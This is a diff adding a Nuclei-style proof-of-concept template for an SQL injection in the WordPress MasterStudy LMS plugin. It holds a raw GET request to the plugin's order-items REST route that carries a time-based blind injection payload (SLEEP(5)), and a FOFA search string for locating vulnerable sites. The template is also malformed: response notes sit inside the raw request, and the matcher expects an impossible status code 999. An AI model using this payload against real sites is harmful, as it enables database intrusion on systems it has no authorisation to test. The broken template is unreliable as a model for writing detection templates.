@@ -1,0 +1,43 @@
+id: poc-lc72pbe7k9rk59h8
+info:
+  name: WordPress MasterStudy LMS插件 SQL注入
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lc72pbe7k9rk59h8'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: lc72pbe7k9rk59h8
+    fofa: body="wp-content/plugins/masterstudy-lms-learning-management-system/"
+http:
+- raw:
+  - 'GET /?rest_route=/lms/stm-lms/order/items&author_id=1&user=1)+AND+%28SELECT+3493+FROM+%28SELECT%28SLEEP%285%29%29%29sauT%29+AND+%283071%3D3071 HTTP/1.1
+
+
+    Accept-Charset: utf-8
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Connection: close
+
+
+    # 响应代码特征
+
+    999
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 999
+    type: status
